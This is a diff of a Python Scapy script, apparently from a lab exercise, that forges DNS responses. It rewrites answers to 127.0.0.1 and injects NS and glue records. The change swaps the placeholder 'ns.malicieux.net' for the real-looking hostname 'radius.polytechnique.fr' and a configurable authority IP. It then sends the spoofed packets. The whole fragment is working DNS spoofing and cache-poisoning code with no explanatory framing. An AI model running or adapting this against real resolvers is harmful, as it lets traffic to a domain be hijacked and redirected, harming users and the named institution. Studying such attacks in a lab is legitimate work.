@@ -12,7 +12,7 @@ paquet[IP].src='0.0.0.0'
 paquet[IP].dst='0.0.0.0'
 paquet[DNS].an[0].rrname='salut.org'
 paquet[DNS].an[0].rdata='0.0.0.0'
-
+ip_autorite = '1.1.1.1' # change me
 
 def maFonction(a):
     i.inc()
@@ -39,8 +39,8 @@ def maFonction(a):
         d.arcount = 0      #No additional records
         d.qd = str(a[DNS].qd)
         d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
-        d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "ns.malicieux.net")
-        d.ar = DNSRR(rrname = "ns.malicieux.net", type = "A", ttl = 86400, rdata = "9.8.7.6")
+        d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
+        d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
         spoofed = IP(src=src, dst=dst)/UDP()/d
         sendp(spoofed, iface_hint=src)
 
